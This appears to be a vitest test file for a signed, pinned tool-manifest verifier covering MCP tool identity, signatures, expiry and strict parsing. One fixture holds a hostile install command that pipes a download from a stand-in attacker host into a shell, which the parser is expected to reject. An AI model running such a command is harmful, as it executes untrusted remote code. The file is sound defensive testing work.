import { generateKeyPairSync, randomBytes } from "node:crypto";
import { describe, expect, it } from "vitest";
import {
  PinnedToolManifestVerifier,
  TOOL_KEY_CANONICAL_PREFIX,
  VerifiedPinnedToolManifest,
  canonicalizePinnedToolManifest,
  canonicalizeToolKey,
  digestPinnedToolManifest,
  digestToolKey,
  parseCanonicalToolKey,
  parsePinnedToolManifest,
  parseSignedPinnedToolManifestEnvelope,
  parseToolKey,
  serializeSignedPinnedToolManifestEnvelope,
  signPinnedToolManifest,
  verifySignedPinnedToolManifest,
  type ManifestTrustAnchor,
  type PinnedToolManifestV1,
  type ToolKey,
} from "../src/tool-manifest.js";

const DESCRIPTOR_A = "a".repeat(64);
const DESCRIPTOR_B = "b".repeat(64);
const ARTIFACT_DIGEST = "c".repeat(64);
const CONTAINER_DIGEST = `sha256:${"d".repeat(64)}`;

function key(
  toolName = "read_document",
  providerId = "acme.example",
  serverId = "documents-prod",
): ToolKey {
  return { providerId, serverId, toolName };
}

function manifest(
  overrides: Partial<PinnedToolManifestV1> = {},
): PinnedToolManifestV1 {
  return {
    manifestVersion: 1,
    issuedAt: "2026-07-01T00:00:00.000Z",
    expiresAt: "2026-08-01T00:00:00.000Z",
    tools: [{
      toolKey: key(),
      descriptorDigest: DESCRIPTOR_A,
      package: {
        ecosystem: "npm",
        name: "@acme/documents-mcp",
        version: "1.2.3",
        artifactDigest: ARTIFACT_DIGEST,
      },
      container: {
        image: "registry.example/acme/documents",
        digest: CONTAINER_DIGEST,
      },
      publisher: {
        id: "publisher:acme",
        displayName: "Acme MCP Team",
        uri: "https://acme.example/security/mcp",
      },
    }],
    ...overrides,
  };
}

function fixedClock(value = "2026-07-27T12:00:00.000Z"): () => Date {
  return () => new Date(value);
}

describe("canonical scoped ToolKey", () => {
  it("round-trips an unambiguous provider/server/tool identity and hashes the scope", () => {
    const original = key("检索_📄", "研究机构.example", "知识库-v2");
    const canonical = canonicalizeToolKey(original);

    expect(canonical.startsWith(TOOL_KEY_CANONICAL_PREFIX)).toBe(true);
    expect(parseCanonicalToolKey(canonical)).toEqual(original);
    expect(digestToolKey(original)).toMatch(/^[a-f0-9]{64}$/);
    expect(digestToolKey(key(original.toolName, original.providerId, "another-server")))
      .not.toBe(digestToolKey(original));
    expect(digestToolKey(key(original.toolName, "another-provider", original.serverId)))
      .not.toBe(digestToolKey(original));
  });

  it("rejects unknown fields, accessors, Proxies, ambiguous Unicode, and control characters", () => {
    expect(() => parseToolKey({ ...key(), extra: true })).toThrow(/unsupported field/);
    expect(() => parseToolKey(new Proxy(key(), {}))).toThrow(/plain object/);
    expect(() => parseToolKey(key("e\u0301"))).toThrow(/NFC-normalized/);
    expect(() => parseToolKey(key("read\u200b_document"))).toThrow(/control\/format/);
    expect(() => parseToolKey(key(" read_document"))).toThrow(/whitespace/);
    expect(() => parseCanonicalToolKey(`${TOOL_KEY_CANONICAL_PREFIX}AA.AA.AA`))
      .toThrow(/UTF-8|non-empty|control\/format/);

    let getterInvoked = false;
    const withAccessor = key() as ToolKey;
    Object.defineProperty(withAccessor, "toolName", {
      enumerable: true,
      get: () => {
        getterInvoked = true;
        return "attacker";
      },
    });
    expect(() => parseToolKey(withAccessor)).toThrow(/data properties/);
    expect(getterInvoked).toBe(false);
  });
});

describe("strict versioned pinned manifest parsing", () => {
  it("canonicalizes entry order while binding descriptor and supply-chain metadata", () => {
    const second = {
      toolKey: key("write_document"),
      descriptorDigest: DESCRIPTOR_B,
    };
    const firstOrder = manifest({ tools: [second, ...manifest().tools] });
    const reverseOrder = manifest({ tools: [...manifest().tools, second] });

    expect(canonicalizePinnedToolManifest(firstOrder))
      .toBe(canonicalizePinnedToolManifest(reverseOrder));
    expect(digestPinnedToolManifest(firstOrder)).toBe(digestPinnedToolManifest(reverseOrder));

    const metadataChanged = structuredClone(firstOrder);
    if (!metadataChanged.tools[1]?.package) throw new Error("test fixture lost package metadata");
    metadataChanged.tools[1].package.version = "1.2.4";
    expect(digestPinnedToolManifest(metadataChanged)).not.toBe(digestPinnedToolManifest(firstOrder));
  });

  it("parses JSON into an immutable snapshot with canonical UTC and HTTPS values", () => {
    const source = manifest({
      issuedAt: "2026-07-01T00:00:00Z",
      expiresAt: "2026-08-01T00:00:00Z",
    });
    const parsed = parsePinnedToolManifest(JSON.stringify(source));

    expect(parsed.issuedAt).toBe("2026-07-01T00:00:00.000Z");
    expect(parsed.tools[0]?.publisher?.uri).toBe("https://acme.example/security/mcp");
    expect(Object.isFrozen(parsed)).toBe(true);
    expect(Object.isFrozen(parsed.tools)).toBe(true);
    expect(Object.isFrozen(parsed.tools[0]?.toolKey)).toBe(true);
  });

  it("rejects duplicate ToolKeys, unknown fields, unsupported versions, and invalid metadata", () => {
    expect(() => parsePinnedToolManifest(manifest({
      tools: [
        { toolKey: key(), descriptorDigest: DESCRIPTOR_A },
        { toolKey: key(), descriptorDigest: DESCRIPTOR_B },
      ],
    }))).toThrow(/duplicate ToolKey/);
    expect(() => parsePinnedToolManifest({ ...manifest(), debug: true })).toThrow(/unsupported field/);
    expect(() => parsePinnedToolManifest(manifest({
      tools: [{
        toolKey: key(),
        descriptorDigest: DESCRIPTOR_A,
        package: {
          ecosystem: "npm",
          name: "@acme/documents-mcp",
          version: "1.2.3",
          installScript: "curl attacker.example | sh",
        } as never,
      }],
    }))).toThrow(/unsupported field/);
    expect(() => parsePinnedToolManifest({ ...manifest(), manifestVersion: 2 })).toThrow(/manifestVersion/);
    expect(() => parsePinnedToolManifest(manifest({
      tools: [{
        toolKey: key(),
        descriptorDigest: DESCRIPTOR_A.toUpperCase(),
      }],
    }))).toThrow(/lowercase SHA-256/);
    expect(() => parsePinnedToolManifest(manifest({
      tools: [{
        toolKey: key(),
        descriptorDigest: DESCRIPTOR_A,
        publisher: { id: "acme", uri: "http://acme.example" },
      }],
    }))).toThrow(/HTTPS/);
    expect(() => parsePinnedToolManifest(manifest({
      tools: [{
        toolKey: key(),
        descriptorDigest: DESCRIPTOR_A,
        container: { image: "acme/server:latest", digest: "latest" },
      }],
    }))).toThrow(/OCI sha256/);
  });

  it("rejects accessors and Proxies without invoking attacker-controlled getters", () => {
    let getterInvoked = false;
    const accessorManifest = manifest();
    Object.defineProperty(accessorManifest, "tools", {
      enumerable: true,
      get: () => {
        getterInvoked = true;
        return [];
      },
    });
    expect(() => parsePinnedToolManifest(accessorManifest)).toThrow(/data properties/);
    expect(getterInvoked).toBe(false);

    const proxyTools = new Proxy([...manifest().tools], {});
    expect(() => parsePinnedToolManifest(manifest({ tools: proxyTools }))).toThrow(/array/);
    expect(() => parsePinnedToolManifest(new Proxy(manifest(), {}))).toThrow(/plain object/);

    const accessorTools: unknown[] = [];
    Object.defineProperty(accessorTools, "0", {
      enumerable: true,
      get: () => {
        getterInvoked = true;
        return manifest().tools[0];
      },
    });
    accessorTools.length = 1;
    expect(() => parsePinnedToolManifest(manifest({ tools: accessorTools as never })))
      .toThrow(/accessor-free/);
    expect(getterInvoked).toBe(false);
  });

  it("enforces tool-count and byte bounds before accepting a manifest", () => {
    expect(() => parsePinnedToolManifest(manifest({
      tools: [
        { toolKey: key("one"), descriptorDigest: DESCRIPTOR_A },
        { toolKey: key("two"), descriptorDigest: DESCRIPTOR_B },
      ],
    }), { maxTools: 1 })).toThrow(/1 entry limit/);

    const json = JSON.stringify(manifest({
      tools: [{
        toolKey: key("x".repeat(300)),
        descriptorDigest: DESCRIPTOR_A,
      }],
    }));
    expect(() => parsePinnedToolManifest(json, { maxManifestBytes: 256 }))
      .toThrow(/exceeds 256 UTF-8 bytes/);
  });
});

describe("Ed25519 signed pinned manifest envelopes", () => {
  it("persists, verifies, and returns explicit public-key trust semantics", () => {
    const { privateKey, publicKey } = generateKeyPairSync("ed25519");
    const envelope = signPinnedToolManifest(manifest(), {
      algorithm: "Ed25519",
      keyId: "publisher-acme-2026-01",
      privateKey,
    });
    const persisted = serializeSignedPinnedToolManifestEnvelope(envelope);
    const parsed = parseSignedPinnedToolManifestEnvelope(persisted);
    const verifier = new PinnedToolManifestVerifier([{
      algorithm: "Ed25519",
      keyId: "publisher-acme-2026-01",
      publicKey,
    }], { clock: fixedClock() });
    const result = verifier.verify(persisted);

    expect(parsed).toEqual(envelope);
    expect(result.verified).toBe(true);
    if (!result.verified) throw new Error("expected valid signed manifest");
    expect(result.diagnostic).toMatchObject({
      outcome: "verified",
      code: "manifest_verified",
      algorithm: "Ed25519",
      keyId: "publisher-acme-2026-01",
      manifestDigest: digestPinnedToolManifest(manifest()),
      toolCount: 1,
      trustSemantics: "operator-pinned-public-key",
    });
    expect(result.value.getSummary()).toMatchObject({
      trustSemantics: "operator-pinned-public-key",
      keyId: "publisher-acme-2026-01",
      toolCount: 1,
    });
    expect(Object.keys(result.value)).not.toContain("entries");
    expect(() => new VerifiedPinnedToolManifest(envelope, fixedClock(), Symbol("forged")))
      .toThrow(/successful signature verification/);
  });

  it("returns precise fail-closed codes for unsupported versions, algorithms, and invalid clocks", () => {
    const { privateKey, publicKey } = generateKeyPairSync("ed25519");
    const envelope = signPinnedToolManifest(manifest(), {
      algorithm: "Ed25519",
      keyId: "strict-parser-key",
      privateKey,
    });
    const anchor: ManifestTrustAnchor = {
      algorithm: "Ed25519",
      keyId: "strict-parser-key",
      publicKey,
    };

    expect(verifySignedPinnedToolManifest({ ...envelope, envelopeVersion: 2 }, [anchor], {
      clock: fixedClock(),
    })).toMatchObject({
      verified: false,
      diagnostic: { code: "unsupported_envelope_version" },
    });
    expect(verifySignedPinnedToolManifest({ ...envelope, algorithm: "RS256" }, [anchor], {
      clock: fixedClock(),
    })).toMatchObject({
      verified: false,
      diagnostic: { code: "unsupported_signature_algorithm" },
    });
    expect(verifySignedPinnedToolManifest(envelope, [anchor], {
      clock: () => new Date(Number.NaN),
    })).toMatchObject({
      verified: false,
      diagnostic: { code: "verifier_clock_invalid" },
    });
    expect(() => parsePinnedToolManifest(manifest({
      issuedAt: "2026-02-30T00:00:00Z",
    }))).toThrow(/real canonical date-time/);
  });

  it("detects manifest, digest, keyId, signature, and key substitution", () => {
    const first = generateKeyPairSync("ed25519");
    const second = generateKeyPairSync("ed25519");
    const envelope = signPinnedToolManifest(manifest(), {
      algorithm: "Ed25519",
      keyId: "key-one",
      privateKey: first.privateKey,
    });
    const anchors: ManifestTrustAnchor[] = [
      { algorithm: "Ed25519", keyId: "key-one", publicKey: first.publicKey },
      { algorithm: "Ed25519", keyId: "key-two", publicKey: first.publicKey },
    ];
    const verifier = new PinnedToolManifestVerifier(anchors, { clock: fixedClock() });

    const contentChanged = structuredClone(envelope);
    contentChanged.manifest.tools[0]!.descriptorDigest = DESCRIPTOR_B;
    expect(verifier.verify(contentChanged)).toMatchObject({
      verified: false,
      diagnostic: { code: "manifest_digest_mismatch" },
    });

    const digestChanged = { ...structuredClone(envelope), manifestDigest: DESCRIPTOR_B };
    expect(verifier.verify(digestChanged)).toMatchObject({
      verified: false,
      diagnostic: { code: "manifest_digest_mismatch" },
    });

    const keyIdChanged = { ...structuredClone(envelope), keyId: "key-two" };
    expect(verifier.verify(keyIdChanged)).toMatchObject({
      verified: false,
      diagnostic: { code: "signature_invalid" },
    });

    const originalSignature = envelope.signature;
    const signatureChanged = {
      ...structuredClone(envelope),
      signature: `${originalSignature[0] === "A" ? "B" : "A"}${originalSignature.slice(1)}`,
    };
    expect(verifier.verify(signatureChanged)).toMatchObject({
      verified: false,
      diagnostic: { code: "signature_invalid" },
    });

    const wrongKeyVerifier = new PinnedToolManifestVerifier([{
      algorithm: "Ed25519",
      keyId: "key-one",
      publicKey: second.publicKey,
    }], { clock: fixedClock() });
    expect(wrongKeyVerifier.verify(envelope)).toMatchObject({
      verified: false,
      diagnostic: { code: "signature_invalid" },
    });
  });

  it("fails closed for malformed JSON, object accessors, Proxies, unknown fields, and unknown keys", () => {
    const keys = generateKeyPairSync("ed25519");
    const verifier = new PinnedToolManifestVerifier([{
      algorithm: "Ed25519",
      keyId: "trusted-key",
      publicKey: keys.publicKey,
    }], { clock: fixedClock() });
    const envelope = signPinnedToolManifest(manifest(), {
      algorithm: "Ed25519",
      keyId: "untrusted-key",
      privateKey: keys.privateKey,
    });

    expect(() => verifier.verify("{")) .not.toThrow();
    expect(verifier.verify("{")).toMatchObject({
      verified: false,
      diagnostic: { code: "malformed_json" },
    });
    expect(verifier.verify(new Proxy(envelope, {}))).toMatchObject({
      verified: false,
      diagnostic: { code: "envelope_schema_invalid" },
    });
    expect(verifier.verify({ ...envelope, extraAuthority: true })).toMatchObject({
      verified: false,
      diagnostic: { code: "envelope_schema_invalid" },
    });
    expect(verifier.verify(envelope)).toMatchObject({
      verified: false,
      diagnostic: { code: "unknown_key_id" },
    });

    let getterInvoked = false;
    const accessor = { ...envelope };
    Object.defineProperty(accessor, "signature", {
      enumerable: true,
      get: () => {
        getterInvoked = true;
        return envelope.signature;
      },
    });
    expect(verifier.verify(accessor)).toMatchObject({
      verified: false,
      diagnostic: { code: "envelope_schema_invalid" },
    });
    expect(getterInvoked).toBe(false);
  });

  it("rejects expired/future manifests and rechecks expiry for every tool binding", () => {
    const { privateKey, publicKey } = generateKeyPairSync("ed25519");
    let clockValue = new Date("2026-07-27T12:00:00.000Z");
    const anchor: ManifestTrustAnchor = {
      algorithm: "Ed25519",
      keyId: "time-key",
      publicKey,
    };
    const signer = {
      algorithm: "Ed25519" as const,
      keyId: "time-key",
      privateKey,
    };

    const expired = signPinnedToolManifest(manifest({
      issuedAt: "2026-07-01T00:00:00.000Z",
      expiresAt: "2026-07-27T12:00:00.000Z",
    }), signer);
    expect(verifySignedPinnedToolManifest(expired, [anchor], {
      clock: () => clockValue,
    })).toMatchObject({ verified: false, diagnostic: { code: "manifest_expired" } });

    const future = signPinnedToolManifest(manifest({
      issuedAt: "2026-07-27T12:10:00.000Z",
      expiresAt: "2026-08-01T00:00:00.000Z",
    }), signer);
    expect(verifySignedPinnedToolManifest(future, [anchor], {
      clock: () => clockValue,
      maxClockSkewMs: 0,
    })).toMatchObject({ verified: false, diagnostic: { code: "manifest_not_yet_valid" } });

    const shortLived = signPinnedToolManifest(manifest({
      expiresAt: "2026-07-27T12:01:00.000Z",
    }), signer);
    const verified = verifySignedPinnedToolManifest(shortLived, [anchor], {
      clock: () => clockValue,
    });
    expect(verified.verified).toBe(true);
    if (!verified.verified) throw new Error("expected short-lived manifest to verify initially");
    expect(verified.value.verifyTool(key(), DESCRIPTOR_A)).toMatchObject({
      verified: true,
      decision: "allow",
    });
    clockValue = new Date("2026-07-27T12:01:00.000Z");
    expect(verified.value.verifyTool(key(), DESCRIPTOR_A)).toMatchObject({
      verified: false,
      decision: "deny",
      code: "manifest_expired",
    });
  });

  it("allows only an exact provider/server/tool and descriptor binding", () => {
    const { privateKey, publicKey } = generateKeyPairSync("ed25519");
    const envelope = signPinnedToolManifest(manifest(), {
      algorithm: "Ed25519",
      keyId: "binding-key",
      privateKey,
    });
    const verified = verifySignedPinnedToolManifest(envelope, [{
      algorithm: "Ed25519",
      keyId: "binding-key",
      publicKey,
    }], { clock: fixedClock() });
    if (!verified.verified) throw new Error("expected signed manifest to verify");

    expect(verified.value.verifyTool(key(), DESCRIPTOR_A)).toMatchObject({
      verified: true,
      code: "tool_binding_verified",
      toolKeyDigest: digestToolKey(key()),
      expectedDescriptorDigest: DESCRIPTOR_A,
    });
    expect(verified.value.verifyTool(key("read_document", "other.example"), DESCRIPTOR_A))
      .toMatchObject({
        verified: false,
        decision: "deny",
        code: "tool_not_pinned",
      });
    expect(verified.value.verifyTool(key(), DESCRIPTOR_B)).toMatchObject({
      verified: false,
      decision: "deny",
      code: "tool_descriptor_mismatch",
      expectedDescriptorDigest: DESCRIPTOR_A,
      observedDescriptorDigest: DESCRIPTOR_B,
    });
    expect(verified.value.verifyTool({ ...key(), unknown: true }, DESCRIPTOR_A)).toMatchObject({
      verified: false,
      decision: "deny",
      code: "tool_verification_input_invalid",
    });
  });
});

describe("HMAC envelopes and diagnostic boundaries", () => {
  it("supports shared-secret integrity while exposing weaker, distinct trust semantics", () => {
    const secret = randomBytes(32);
    const envelope = signPinnedToolManifest(manifest(), {
      algorithm: "HMAC-SHA256",
      keyId: "deployment-shared-secret",
      secret,
    });
    const verified = verifySignedPinnedToolManifest(envelope, [{
      algorithm: "HMAC-SHA256",
      keyId: "deployment-shared-secret",
      secret,
    }], { clock: fixedClock() });

    expect(verified.verified).toBe(true);
    if (!verified.verified) throw new Error("expected valid HMAC manifest");
    expect(verified.diagnostic.trustSemantics).toBe("shared-secret-domain");
    expect(verified.value.getSummary().trustSemantics).toBe("shared-secret-domain");

    expect(verifySignedPinnedToolManifest(envelope, [{
      algorithm: "HMAC-SHA256",
      keyId: "deployment-shared-secret",
      secret: randomBytes(32),
    }], { clock: fixedClock() })).toMatchObject({
      verified: false,
      diagnostic: { code: "signature_invalid" },
    });
    expect(() => signPinnedToolManifest(manifest(), {
      algorithm: "HMAC-SHA256",
      keyId: "too-short",
      secret: randomBytes(31),
    })).toThrow(/between 32/);
  });

  it("rejects algorithm confusion and invalid trust-anchor configurations", () => {
    const ed = generateKeyPairSync("ed25519");
    const hmacEnvelope = signPinnedToolManifest(manifest(), {
      algorithm: "HMAC-SHA256",
      keyId: "same-id",
      secret: randomBytes(32),
    });
    expect(verifySignedPinnedToolManifest(hmacEnvelope, [{
      algorithm: "Ed25519",
      keyId: "same-id",
      publicKey: ed.publicKey,
    }], { clock: fixedClock() })).toMatchObject({
      verified: false,
      diagnostic: { code: "key_algorithm_mismatch" },
    });

    expect(() => new PinnedToolManifestVerifier([
      { algorithm: "Ed25519", keyId: "duplicate", publicKey: ed.publicKey },
      { algorithm: "Ed25519", keyId: "duplicate", publicKey: ed.publicKey },
    ])).toThrow(/duplicate trust-anchor/);
    const rsa = generateKeyPairSync("rsa", { modulusLength: 2048 });
    expect(() => new PinnedToolManifestVerifier([{
      algorithm: "Ed25519",
      keyId: "rsa-is-not-ed25519",
      publicKey: rsa.publicKey,
    }])).toThrow(/Ed25519 public key/);
  });

  it("keeps a bounded metadata-only verification history", () => {
    const { privateKey, publicKey } = generateKeyPairSync("ed25519");
    const sensitiveManifest = manifest({
      tools: [{
        toolKey: key("secret_internal_exporter"),
        descriptorDigest: DESCRIPTOR_A,
        package: {
          ecosystem: "npm",
          name: "@private/never-log-this-package",
          version: "9.9.9",
        },
        publisher: {
          id: "publisher-do-not-log",
          displayName: "Confidential Publisher Name",
        },
      }],
    });
    const envelope = signPinnedToolManifest(sensitiveManifest, {
      algorithm: "Ed25519",
      keyId: "metadata-safe-key",
      privateKey,
    });
    const verifier = new PinnedToolManifestVerifier([{
      algorithm: "Ed25519",
      keyId: "metadata-safe-key",
      publicKey,
    }], {
      clock: fixedClock(),
      maxDiagnostics: 2,
    });

    verifier.verify(envelope);
    verifier.verify("not-json");
    verifier.verify(envelope);
    const diagnostics = verifier.listDiagnostics();
    const serialized = JSON.stringify(diagnostics);

    expect(diagnostics).toHaveLength(2);
    expect(diagnostics.map(({ sequence }) => sequence)).toEqual([2, 3]);
    expect(serialized).not.toContain("secret_internal_exporter");
    expect(serialized).not.toContain("never-log-this-package");
    expect(serialized).not.toContain("Confidential Publisher Name");
    expect(serialized).toContain("metadata-safe-key");
  });
});
